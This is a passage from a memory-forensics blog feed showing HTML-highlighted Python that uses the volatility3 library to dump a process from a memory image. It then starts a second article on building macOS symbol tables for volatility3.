style="color:rgb(255, 121, 198)">"""We want to save our files directly to disk"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           fd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_name </span><span class="token operator">=</span><span class="token plain"> tempfile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mkstemp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">suffix </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'.vol3'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> prefix </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'tmp_'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">dir</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file </span><span class="token operator">=</span><span class="token plain"> io</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">fd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'w+b'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           CLIFileHandler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> item </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> item</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'_'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> item </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'closed'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'close'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'mode'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'name'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                   </span><span class="token builtin" style="color:rgb(189, 147, 249)">setattr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> item</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">getattr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> item</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__getattr__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> item</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">getattr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> item</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@property</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">closed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">closed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@property</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@property</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Closes and commits the file (by moving the temporary file to the correct name"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token comment" style="color:rgb(98, 114, 164)">## Don't overcommit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">closed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           output_filename </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_get_final_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">rename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> output_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> CLIDirectFileHandler</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">image_name </span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   available_automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">available</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   plugin_config_path </span><span class="token operator">=</span><span class="token plain"> interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">configuration</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path_join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">available_automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.stackers'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stacker</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_os_stackers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.single_location'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"file://"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getcwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"/"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> image_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   constructed </span><span class="token operator">=</span><span class="token plain"> construct_plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> file_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getcwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> constructed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">basicConfig</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">level</span><span class="token operator">=</span><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">require_interface_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx </span><span class="token operator">=</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">## Construct a blank context</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">failures </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">import_files</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">##Load the framework plugins</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> failures</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Some volatility3 plugin couldn't be loaded : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">failures</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Plugins are loaded without failure"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugin_list </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">list_plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">base_config_path </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"plugins"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"plugins.PsList.pid"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">252</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"plugins.PsList.dump"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">constructed </span><span class="token operator">=</span><span class="token plain"> build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Triage-Memory.mem"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin_list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'windows.pslist.PsList'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> constructed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   result </span><span class="token operator">=</span><span class="token plain"> text_renderer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PrettyTextRenderer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">render</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">constructed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>There we go, when interpreted, this script will dump the process with PID 252 using the PsList plugin. Now that you know more about how to use the volatility3 framework libraries, you can imagine any application you want to a real case scenario!
Conclusion</p>
<p>I hope you now have a better understanding of how the volatility3 framework is working behind the scene, how easy it is to exploit and integrate it inside your investigation tools. You can of course write your own renderers to directly inject the results inside a database or any format that suite your needs. VolWeb is using volatility3 as a library and this article is directly linked to the latest release exploiting this capability.
You can check VolWeb by clicking the link below.</p>
<blockquote>
<p>This article is written from my own understanding of this subject and any critics you may have are welcomed to make this article evolve. You can contact me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a>.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="references">References<a href="https://forensicxlab.github.io/blog/volaslib#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References">‚Äã</a></h2>
<ul>
<li>Volatility3 Documentation : <a href="https://volatility3.readthedocs.io/en/stable/using-as-a-library.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/stable/using-as-a-library.html</a></li>
<li>Volatility3 Project : <a href="https://github.com/volatilityfoundation/volatility3" target="_blank" rel="noopener noreferrer">https://github.com/volatilityfoundation/volatility3</a></li>
</ul>]]></content:encoded>
            <category>DFIR</category>
            <category>Volatility</category>
            <category>Memory Forensics</category>
        </item>
        <item>
            <title><![CDATA[üìÑ Volatility3 - ISF for MacOs]]></title>
            <link>https://forensicxlab.github.io/blog/macisf</link>
            <guid>https://forensicxlab.github.io/blog/macisf</guid>
            <pubDate>Tue, 22 Mar 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Being interested in memory forensic for a while now I have learned a lot about the Volatility framework. This article will introduce volatility3 core components and focus on kernel symbols. Next, I will explain the steps I took to generate a lot of MacOs SymbolTables. Finally you will be able to retrieve those SymbolsTables directly from github. The final goal is to create a public repository like windows to automatically identify mac os system version and directly download the associated SymbolTables.]]></description>
            <content:encoded><![CDATA[<p>Being interested in memory forensic for a while now I have learned a lot about the Volatility framework. This article will introduce volatility3 core components and focus on kernel symbols. Next, I will explain the steps I took to generate a lot of MacOs SymbolTables. Finally you will be able to retrieve those SymbolsTables directly from github. The final goal is to create a public repository like windows to automatically identify mac os system version and directly download the associated SymbolTables.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="volatility">Volatility<a href="https://forensicxlab.github.io/blog/macisf#volatility" class="hash-link" aria-label="Direct link to Volatility" title="Direct link to Volatility">‚Äã</a></h2>
<p>Memory analysis is focusing on the extraction of evidence by exploiting the Random Access Memory (abbreviated to RAM) of a given system. Volaltility is the best state of the art framework to perform digital forensic on RAM after its acquisition. Volatility has become the world‚Äôs most widely used memory forensics platform and its python3 version is currently under active development.</p>
